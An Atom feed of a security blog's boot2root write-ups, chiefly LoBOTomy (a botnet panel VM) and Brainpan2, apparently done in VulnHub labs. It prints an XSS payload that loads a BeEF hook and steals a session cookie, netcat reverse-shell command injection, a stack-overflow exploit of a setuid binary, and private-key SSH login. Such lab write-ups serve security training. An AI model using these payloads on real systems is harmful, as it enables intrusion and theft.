<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: boot2root | vinicius777 - InfoSec]]></title>
  <link href="http://vinicius777.github.io/blog/categories/boot2root/atom.xml" rel="self"/>
  <link href="http://vinicius777.github.io/"/>
  <updated>2014-06-12T13:42:53+10:00</updated>
  <id>http://vinicius777.github.io/</id>
  <author>
    <name><![CDATA[Vinicius Marino]]></name>
    <email><![CDATA[vinicius777@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[LoBOTomy - Writeup]]></title>
    <link href="http://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup/"/>
    <updated>2014-06-12T09:13:20+10:00</updated>
    <id>http://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup</id>
    <content type="html"><![CDATA[<p>From the series Malware Must Die, Bwall <a href="https://twitter.com/botnet_hunter" target="_black"> @botnet_hunter </a> created the vulnerable VM that allows us to play with the BOTNET without doing anything illegal across the Internet. The VM holds the Madness PRO Panel that is vulnerable by itself. 
<!-- more --></p>

<h3> Madness PRO! </h3>

<p>Madness PRO is a relatively recent DDoS botnet, fist seen by ASERT in the second half of 2013 and also profiled by <a href="http://malware.dontneedcoffee.com/2013/10/meet-madness-pro-or-few-days-rise-of.html" target="_black"> Kafeine</a> in October 2013.
A botnet hunter called Bwall woundn’t sleep without spend a good few hours poking the bot and the panel vulnerabilities (silly botters), check his blog at <a href="http://blog.cylance.com/a-study-in-bots-lobotomy" target="_blank"> blog.cylance.com/a-study-in-bots-labotomy </a> and the complete study at <a href="http://blog.cylance.com/a-study-in-bots-madness-pro" target="_blank"> blog.cylance.com/a-study-in-bots-madness-pro<a></a>.</a></p>

<p>Note, before you attempt this VM you may want to read Bwall blog’s post, useful information about how the panel works and what could be used to exploit the panel, in other words, he did the heavy lift for all of us! </p>

<h3> Poke Around </h3>

<p>Once access HTTP you will see information about the VM and a few PROTIPS that you may want to follow during the game!</p>

<center>
<img src="/images/madness1.png" title="" >
</center>

<p>A dirb custom wordlist was running on the background trying to get the bot panel source as the protips suggests. The Panel is located in the web root directory “http://192.168.1.25/Panel.zip”.</p>

<p>When unzip the file, ‘inc/config.php’ holds the password used to login  “http://192.168.1.25/m/adm/auth.php” but I know (it’s on Bwall blog) that the panel is vulnerable to XSS and also, SmilerJS access the panel every minute.</p>

<p>Thinking of this perspective, I could setup an evil php cookie stealer and steal the cookies to access the panel as admin (hard way) or type madness/madness user/password also would work and save me from this work.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="CodeRay">
  <div class="code"><pre>
<span class="local-variable">$conf</span>[‘adname’]  = “madness”;&lt;br /&gt;
<span class="local-variable">$conf</span>[‘adpass’]  = “madness”;
<span class="local-variable">$conf</span>[‘guname’]  = “mad”;
<span class="local-variable">$conf</span>[‘gupass’]  = “madness”;
</pre></div>
</div>
 </figure></notextile></div></p>

<p>Yeah! That’s right, Let’s go for the hard way!</p>

<h3> Hooking </h3>

<p>When comes to XSS, BEEF project is the best tool to use, it does not hold you back! Wondering what would be my life without BEEF framework…</p>

<p><div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>/usr/share/beef-xss# ./beef</span><span class='line output'>	[10:59:06][<em>] Bind socket [imapeudora1] listening on [0.0.0.0:2000].
</span><span class='line output'>	[10:59:06][</em>] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha
</span><span class='line output'>	[10:59:06]    |   Twit: @beefproject
</span><span class='line output'>	[10:59:06]    |   Site: http://beefproject.com
</span><span class='line output'>	[10:59:06]    |   Blog: http://blog.beefproject.com
</span><span class='line output'>	[10:59:06]    |_  Wiki: https://github.com/beefproject/beef/wiki
</span><span class='line output'>	[10:59:06][<em>] Project Creator: Wade Alcorn (@WadeAlcorn)
</span><span class='line output'>	[10:59:07][</em>] BeEF is loading. Wait a few seconds…
</span><span class='line output'>	[10:59:07][<em>] 10 extensions enabled.
</span><span class='line output'>	[10:59:07][</em>] 171 modules enabled.
</span><span class='line output'>	[10:59:07][<em>] 2 network interfaces were detected.
</span><span class='line output'>	[10:59:07][+] running on network interface: 127.0.0.1
</span><span class='line output'>	[10:59:07]    |   Hook URL: http://127.0.0.1:3000/hook.js
</span><span class='line output'>	[10:59:07]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
</span><span class='line output'>	[10:59:07][+] running on network interface: 192.168.1.13
</span><span class='line output'>	[10:59:07]    |   Hook URL: http://192.168.1.13:3000/hook.js
</span><span class='line output'>	[10:59:07]    |_  UI URL:   http://192.168.1.13:3000/ui/panel
</span><span class='line output'>	[10:59:07][</em>] RESTful API key: 1dad2d1bf169671680757610ac50df2511f90748
</span><span class='line output'>	[10:59:07][<em>] HTTP Proxy: http://127.0.0.1:6789
</span><span class='line output'>	[10:59:07][</em>] BeEF server started (press control+c to stop)</span></code></pre></td></tr></table></div></div>
        </div></p>

<p>Once beef is up and ruuning, It’s ready to hook abusing the XSS vulnerability present on the madness panel. Let’s send the request using curl:</p>

<p><div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line output'></p>
</span><span class='line output'>
</span><span class='line output'><p>~ curl -v “http://192.168.1.25/m/?uid=12345%3Cimg%20alt%3D')%3B%5C%22%3E%3Cscript%20src="http://192.168.1.13:3000/hook.js"&gt;%3C%2Fscript%3E%3C%2Fa%3E%3Ca%20href%3D%22%23%22%20onload%3D%5C%22set_status('12345”
</span><span class='line output'>* About to connect() to 192.168.1.25 port 80 (#0)
</span><span class='line output'>*   Trying 192.168.1.25…
</span><span class='line output'>* connected
</span><span class='line output'>* Connected to 192.168.1.25 (192.168.1.25) port 80 (#0)
</span><span class='line output'>&gt; GET /m/?uid=12345%3Cimg%20alt%3D')%3B%5C%22%3E%3Cscript%20src=”http://192.168.1.13:3000/hook.js”&gt;%3C%2Fscript%3E%3C%2Fa%3E%3Ca%20href%3D%22%23%22%20onload%3D%5C%22set_status('12345 HTTP/1.1
</span><span class='line output'>&gt; User-Agent: curl/7.26.0
</span><span class='line output'>&gt; Host: 192.168.1.25
</span><span class='line output'>&gt; Accept: <em>/</em>
</span><span class='line output'>&gt; 
</span><span class='line output'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line output'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line output'>&lt; HTTP/1.1 200 OK
</span><span class='line output'>&lt; Date: Thu, 12 Jun 2014 01:06:48 GMT
</span><span class='line output'>&lt; Server: Apache/2.4.9 (Debian)
</span><span class='line output'>&lt; X-Powered-By: PHP/5.5.11-3
</span><span class='line output'>&lt; Content-Length: 4
</span><span class='line output'>&lt; Content-Type: text/html
</span><span class='line output'>&lt; 
</span><span class='line output'>* Connection #0 to host 192.168.1.25 left intact
</span><span class='line output'>d3Rm* Closing connection #0</span></code></pre></td></tr></table></div></div>
        </div></p>

<p><code>[11:07:32][*] New Hooked Browser [id:3, ip:192.168.1.25, type:UNKNOWN-UNKNOWN, os:Linux], hooked domain [127.0.0.1:80] Cookies: PHPSESSID=vj55ab2vhml525savcgvkrd6p6;</code></p>

<p>SmilerJS browser is hooked. The PHPSESSID allows me to access the Panel as admin if I change my cookies but I am not going to access it because if I do, my browser would be hooked too due to the persistent XSS.</p>

<p>The best thing to do is to enumerate the VM abusing from the XSS using BEFF framework to trun it into a shell access, maybe! ;-)</p>

<h3> Enumeration </h3>

<p>Enumeration over XSS is painful because it’s slow as hell and you have to be patients  about this! It’s even harder/frustration  when your victim closes the hooked browser before you attempt one single exploit. </p>

<p>In this case, time isn’t a problem as the SimilerJS browser connects every minute to our hook.</p>

<p>First, I enumerate the box by scan open ports as localhost, secondly, I ran the XSS proxy (running on localhost:6789 by default).</p>

<center>
<img src="/images/madness2.png" title="" >
</center>

<p>Port 8080 is open, and it’s time to run dirbuster over this port!</p>

<h3> Shell Access </h3>

<p>Port 8080 is open and running only for local connections which is at least suspicious, right ? </p>

<p>Dirbuster is up and running, and a unexpected thing happened! When dirbuster tried to get the /id request look what I got in the output:</p>

<p><code>uid=0(root) gid=0(root) groups=0(root)</code></p>

<p>I quickly opened by browser, setting the proxy http confs to localhost:6789 and requested “/uname -a;id”</p>

<center>
<img src="/images/madness3.png">
</center>

<p>Bingo!</p>

<p>Let me run a listener on attacker machine and make the target connect to it using netcat.</p>

<p><div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>nc -vlp 1111</span><span class='line output'>nc: listening on :: 1111 …
</span><span class='line output'>nc: listening on 0.0.0.0 1111 …
</span><span class='line output'>nc: connect to 192.168.1.13 1111 from . (192.168.1.25) 60088 [60088]
</span><span class='line output'>python -c ‘import pty;pty.spawn(“/bin/bash”)’
</span><span class='line output'>root@madness:/# id
</span><span class='line output'>id
</span><span class='line output'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line output'>root@madness:/# ls /root
</span><span class='line output'>ls /root
</span><span class='line output'>bindshell.py  browser.js  slimerjs-0.9.1
</span><span class='line output'>root@madness:/#</span></code></pre></td></tr></table></div></div>
        </div> </p>

<p>The end of the game!!! Hope you like it! </p>

<p>Thanks to <a href="https://www.vulnhub.com" target="_black"> VulnHub </a> and <a href="https://twitter.com/botnet_hunter" target="_black"> @botnet_hunter </a></p>

<p>Comments are welcome.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecOS - Writeup]]></title>
    <link href="http://vinicius777.github.io/blog/2014/05/23/secos-writeup/"/>
    <updated>2014-05-23T13:15:41+10:00</updated>
    <id>http://vinicius777.github.io/blog/2014/05/23/secos-writeup</id>
    <content type="html"><![CDATA[<p>SecOS is an entry-level boot2root Web basead, created by <a href="https://twitter.com/PaulWebSec" target="_black"> @PaulWebSec</a> hosted at <a href="http://www.vulnhub.com" target="_black"> VulnHub. </a></p>

<!-- more -->

<h3> Watch the Video </h3>
<p><div class="embed-video-container"><iframe src="http://www.youtube.com/embed/DbOKRPbyZN8" allowfullscreen></iframe></div></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hades Challenge - Writeup]]></title>
    <link href="http://vinicius777.github.io/blog/2014/05/23/hades-challenge-writeup/"/>
    <updated>2014-05-23T12:28:05+10:00</updated>
    <id>http://vinicius777.github.io/blog/2014/05/23/hades-challenge-writeup</id>
    <content type="html"><![CDATA[<p>Hades is a boot2root challenge designed by Loki_Sigma. Hades has los of tricks and exploitation techniques are required to see the content of /root/flag.txt. 
Thank you Loki_Sigma and <a href="http://www.twitter.com/vulnhub" target="_black"> @VulnHub </a> for such a competition. 
I’ve learned new techniques during the competition and by the same time having lots of fun! 
<!-- more --></p>

<p>Remember, this is not the only way to solve this challenge, but It’s the way that I made it happened! :-) </p>

<p>Hope you like it.	</p>

<center>
<img src="/images/Infernal_Hades-GFX.png" width="400" height="300">
</center>

<p><strong> Download the write-up in PDF <a href="http://vinicius777.github.io/download/hades/walkthrough.pdf" target="_black"> HERE </a></strong></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Brainpan2 Challenge - Writeup]]></title>
    <link href="http://vinicius777.github.io/blog/2014/05/22/brainpan2-challenge-writeup/"/>
    <updated>2014-05-22T12:16:54+10:00</updated>
    <id>http://vinicius777.github.io/blog/2014/05/22/brainpan2-challenge-writeup</id>
    <content type="html"><![CDATA[<p>Brainpan2 was a fun challenge competition made by @superkojiman. From the beginner to the end I felt that I was being trolled and to be honest, I was! ;-) Thanks VulnHub and @superkojiman for such an entertainment, can’t wait for the next one.
<!-- more --></p>

<h3> Poking around </h3>

<p>A Nmap scan would show me what expect in brainpan2, and it did! Only 2 TCP ports were stated open, 9999 as Unknown and 10000 running ‘SimpleHTTP 0.6’.</p>

<p><div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nmap -sS  -T5 192.168.1.35 -p1-</p></span><span class='line output'>
</span><span class='line output'><p>Starting Nmap 6.40 ( http://nmap.org ) at 2014-05-22 12:13 EST
</span><span class='line output'>Nmap scan report for . (192.168.1.35)
</span><span class='line output'>Host is up (0.00072s latency).
</span><span class='line output'>Not shown: 65533 closed ports
</span><span class='line output'>PORT      STATE SERVICE
</span><span class='line output'>9999/tcp  open  abyss
</span><span class='line output'>10000/tcp open  snet-sensor-mgmt
</span><span class='line output'>MAC Address: 00:0C:29:82:A8:00 (VMware)</p>
</span><span class='line output'>
</span><span class='line output'><p>Nmap done: 1 IP address (1 host up) scanned in 5.80 seconds</span></code></pre></td></tr></table></div></div>
        </div>
By picking one port to start with, I picked the web port 10000. When first requested in browser a graph of cyber attacks was displayed and I quickly ran ‘dirb’ to bruteforce possible directories on the web application. 
I found ‘/bin’ directory, containing an executable file called ‘brainpan.exe’.
Using wget, I downloaded brainpan.exe and used file command to read those first 64 words of the file header pointing me what kind of file am I dealing with:</p>

<section>
  <p class="lead"> 
    brainpan.exe: JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85"


Renamed from .exe to .jpg and opened, look what I got:

<center>
<img src="/images/brainpan1.jpg">
</center>

After digging a bit I can say that it is a normal JPG file! A properly look into SimpleHTTP 0.6 python application spend part of my time and ended up with nothing. 
Let's jump right into port 9999 and see how far I can go with it.

<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nc 192.168.1.35 9999</span><span class='line output'>_|                            _|                                        
</span><span class='line output'>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
</span><span class='line output'>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span><span class='line output'>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span><span class='line output'>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
</span><span class='line output'>                                            _|                          
</span><span class='line output'>                                            _|
</span><span class='line output'>
</span><span class='line output'>[______________________ WELCOME TO BRAINPAN 2.0________________________]
</span><span class='line output'>                             LOGIN AS GUEST                             
</span><span class='line output'>
</span><span class='line output'>                          &gt;&gt;</span></code></pre></td></tr></table></div></div>
        </div>

<h3> First Shell </h3>

I managed to gain a non-privileged shell access by abusing the shell escape technique <a href="http://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells"> (See Reference) </a>.
'Login as GUEST', pretty much suggests how to login into the application, and a 'VIEW' command allows me to get any local file with reading privileges.
I've set NetCat waiting for connections on port 1111 on attacker machine, to brainpan2 reverse connect occurs bring me shell access.

<h6>Command Escape</h6>
<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line output'>&gt;&gt; GUEST
</span><span class='line output'>                          ACCESS GRANTED
</span><span class='line output'>
</span><span class='line output'>
</span><span class='line output'>                             *  *  *  *                                
</span><span class='line output'>    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
</span><span class='line output'>    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
</span><span class='line output'>                             *  *  *  *                                
</span><span class='line output'>
</span><span class='line output'>
</span><span class='line output'>                          &gt;&gt; TELL ME MORE
</span><span class='line output'>    FILES    HELP    VIEW       CREATE
</span><span class='line output'>    USERS    MSG     SYSTEM     BYE
</span><span class='line output'>
</span><span class='line output'>                          &gt;&gt; VIEW
</span><span class='line output'>    ENTER FILE TO DOWNLOAD: ie |nc 192.168.1.10 1111 -e /bin/bash</span></code></pre></td></tr></table></div></div>
        </div>

<h6> Reverse Connected </h6>
<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nc -vlp 1111</span><span class='line output'>nc: listening on :: 1111 ...
</span><span class='line output'>nc: listening on 0.0.0.0 1111 ...
</span><span class='line output'>nc: connect to 192.168.1.10 1111 from . (192.168.1.35) 37001 [37001]
</span><span class='line output'>id
</span><span class='line output'>uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
</span><span class='line output'>python -c 'import pty;pty.spawn("/bin/bash")'
</span><span class='line output'>anansi@brainpan2:/opt/brainpan$</span></code></pre></td></tr></table></div></div>
        </div>

<h3> Escalate Privileges </h3>

Escalate privileges would be painful or even 'impossible' without a long enumeration process on the way, as much as you collect information from target you get closer to the final escalation. If you are struggling, there's a good <a href="http://www.rebootuser.com/?p=1623"> Escalation CheatSheet </a> that could be used.

Looking up for suid file are always a good call! On '/home/reynard' a binaray called 'msg_root' holds suid as root and is vulnerable to BOF (Buffer Overflow). The 'strings' command output shows what function the binary are using and is easy to identify vulnerable ones. 

<section>
  <p class="lead"> 
    msg_root: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xb8fa383bdc6bb917a22e57f547aaa4f5383181e6, not stripped
    -rwsr-xr-x 1 root root 8999 Nov  6  2013 msg_root&gt;


I copied the binary using scp to attacker machine (you still can use netcat to transfer small files). Once msg_root is transfered, let's exploit it.


<h3>Binary Exploit</h3>

<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ gdb ./msg_root  -q</span><span class='line output'>Reading symbols from /root/msg_root...done.
</span><span class='line output'>(gdb) run $(python -c "print '\x41' * 14 + '\x42' * 4") msg
</span><span class='line output'>Starting program: /root/msg_root $(python -c "print '\x41' * 14 + '\x42' * 4") msg
</span><span class='line output'>
</span><span class='line output'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line output'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></div>
        </div>

Let's loading the 'msg_root' binary using GDB and send a couple of junk. <strong> Note, I will not demostrate the pattern_create and pattern_offset process</strong>, both tools can be found at '/usr/share/metasploit-framework/tools'.
When sent 14 bytes of junk, the next byte will overwrite EIP (+4), however, when 'jmp esp' instruction is called, I don't have enought space to place my shellcode into memory, so, how do I do then ? 

What if I place my shellcode inside the linux environment path and point EIP to the address path? Would work isn't ? Yeah! It would! If you want to read about Small Buffer Overflows, I recommend the <a href="http://insecure.org/stf/smashstack.html"> 'Smashing the Stack for Fun and Profit' </a> by Aleph One.

See Exploit used to perform this task <a href="http://vinicius777.github.io/download/brainpan2"> HERE</a>. The 'eggcode.c' loads the shellcode into the linux variable path and 'findeggaddr.c' gets the memory address where the shellcode is at. Both C files were compliled on attacker machine and placed on target.

<section>
  <p class="lead"> 
    ./eggcode &amp;&amp; ./findeggaddr
    EGG address: 0xbffffd6e


<strong>0xbffffd6e</strong> this is the address where the shellcode lives. Let's exploit the binary using this address to overwrite EIP.


<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ ./eggcode</span><span class='line output'>	./findeggaddr
</span><span class='line output'>	EGG address: 0xbffffd6e
</span><span class='line output'>	/home/reynard/msg_root $(python -c "print 'A' * 14 + '\x6e\xfd\xff\xbf'") msg
</span><span class='line output'>	AhmadUUMUni
</span><span class='line output'>	id
</span><span class='line output'>	uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
</span><span class='line output'>	cat /root/flag.txt
</span><span class='line output'>	cat: flag.txt: Permission denied
</span><span class='line output'>	ls /root
</span><span class='line output'>	flag.txt whatif.txt
</span><span class='line output'>	cat whatif.txt
</span><span class='line output'>
</span><span class='line output'>
</span><span class='line output'>       WHAT IF I TOLD YOU
</span><span class='line output'>              ___
</span><span class='line output'>            /     \ 
</span><span class='line output'>           | ______\
</span><span class='line output'>          (, \_/ \_/
</span><span class='line output'>           |   ._. |
</span><span class='line output'>           \   --- /
</span><span class='line output'>           /`-.__.'
</span><span class='line output'>      .---'`-.___|\___
</span><span class='line output'>     /                `.
</span><span class='line output'>
</span><span class='line output'>       YOU ARE NOT ROOT?
</span><span class='line output'>    id "root "
</span><span class='line output'>	uid=0(root ) gid=0(root ) groups=0(root )</span></code></pre></td></tr></table></div></div>
        </div>

What ??? What if I told you... No way... It's not done yet! root isn't root, root user is "root "! 

<h3> Second Enumeration </h3>

After another closer look into Suid files I ended up with '/opt/old/brainpan-1.8/brainpan-1.8.exe' but this time the exe isn't a JPG file! It's a ELF binaray that holds suid for the user 'puck'.

<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ pwd</span><span class='line output'>  /opt/old/brainpan-1.8
</span><span class='line output'>  ls -lha
</span><span class='line output'>  total 36K
</span><span class='line output'>  drwxrwxr-x 2 root  staff 4.0K Nov  5  2013 .
</span><span class='line output'>  drwx------ 3 root  root  4.0K Nov  4  2013 ..
</span><span class='line output'>  -rwsr-xr-x 1 puck  puck   18K Nov  4  2013 brainpan-1.8.exe
</span><span class='line output'>  -rw-r--r-- 1 puck  puck  1.2K Nov  5  2013 brainpan.7
</span><span class='line output'>  -rw-rw-rw- 1 puck  staff   27 Nov  5  2013 brainpan.cfg
</span><span class='line output'>  cat brainpan.cfg
</span><span class='line output'>  port=9333
</span><span class='line output'>  ipaddr=127.0.0.1
</span><span class='line output'>  file brainpan-1.8.exe
</span><span class='line output'>  brainpan-1.8.exe: setuid ELF 32-bit LSB executable, Intel 80386, version 1(SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xcce373746445bee7531358c8b349018de08ec1f3, not stripped</span></code></pre></td></tr></table></div></div>
        </div>

I quickly changed the 'brainpan.cfg' configuration file by replace loopback address '127.0.0.1' to '192.168.1.35' (in my case) and ran the binary './brainpan-1.8.exe'.
Once connected, using netcat on port 9333, I did exactly like the firs shell; abusing of command ecapes on VIEW command once logged as GUEST.

<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nc -vlp 1212</span><span class='line output'>    nc: listening on :: 1212 ...
</span><span class='line output'>    nc: listening on 0.0.0.0 1212 ...
</span><span class='line output'>    nc: connect to 192.168.1.10 1212 from . (192.168.1.35) 44679 [44679]
</span><span class='line output'>    id
</span><span class='line output'>    uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span></code></pre></td></tr></table></div></div>
        </div>

Good! Shell connected as 'puck' user. First thing to do is to browser into 'puck' home directory.
Note that SSH is active on port 2222 accepting connections from localhost, only.

<section>
 <p class="lead">
 	tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -               


On 'puck' home directory, I have found a .backup directory with .bash_history accessible!
Let's look inside this history file:
<section>
 &lt;p class"lead"&gt;
 	ssh -l "root " brainpan2
 	cat .bash_history 
 	ls
 	mkdir .backup
 	mv .ssh .bash* .backup
</section>

Huumm... ;-)

<h3> Hands on the flag </h3>

I know that RSA SSH keys lives on .backup inside 'puck' home directory, however, euid (SUID) will not allow me to connect using the key directly from .backup, so I copied id_rsa to '/tmp', giving the file rights permission and SSH should not ask for any password once using the private RSA key.

<div class="window">
          <nav class="control-window">
            <a href="#finder" class="close" data-rel="close">close</a>
            <a href="#" class="minimize">minimize</a>
            <a href="#" class="deactivate">deactivate</a>
          </nav>
          <h1 class="titleInside">Terminal</h1>
          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ ssh -l "root " brainpan2 -p 2222 -i id_rsa</span><span class='line output'>ssh -l "root " brainpan2 -p 2222 -i id_rsa
</span><span class='line output'>Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
</span><span class='line output'>
</span><span class='line output'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line output'>the exact distribution terms for each program are described in the
</span><span class='line output'>individual files in /usr/share/doc/*/copyright.
</span><span class='line output'>
</span><span class='line output'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line output'>permitted by applicable law.
</span><span class='line output'>Last login: Thu May 22 05:48:53 2014 from localhost
</span><span class='line output'>root @brainpan2:~# cat /root/flag.txt
</span><span class='line output'>cat /root/flag.txt
</span><span class='line output'>
</span><span class='line output'>                          !!! CONGRATULATIONS !!!
</span><span class='line output'>
</span><span class='line output'>                 You've completed the Brainpan 2 challenge! 
</span><span class='line output'>                 Or have you...? 
</span><span class='line output'>
</span><span class='line output'>                 Yes, you have! Pat yourself on the back. :-)
</span><span class='line output'>
</span><span class='line output'>                 Questions, comments, suggestions for new VM
</span><span class='line output'>                 challenges? Let me know! 
</span><span class='line output'>
</span><span class='line output'>
</span><span class='line output'>                 Twitter: @superkojiman
</span><span class='line output'>                 Email  : contact@techorganic.com
</span><span class='line output'>                 Web    : http://www.techorganic.com
</span><span class='line output'>
</span><span class='line output'>root @brainpan2:~# id
</span><span class='line output'>id
</span><span class='line output'>uid=0(root ) gid=0(root ) groups=0(root )
</span><span class='line output'>root @brainpan2:~#</span></code></pre></td></tr></table></div></div>
        </div>

<strong> Done! Brainpan2 is solved! Remember that, this is the way that I solved but there is maybe others ways to capture the flag. </strong> 

Hope you like! 









</p></section></p></section></p></section></p></section>
]]></content>
  </entry>
  
</feed>
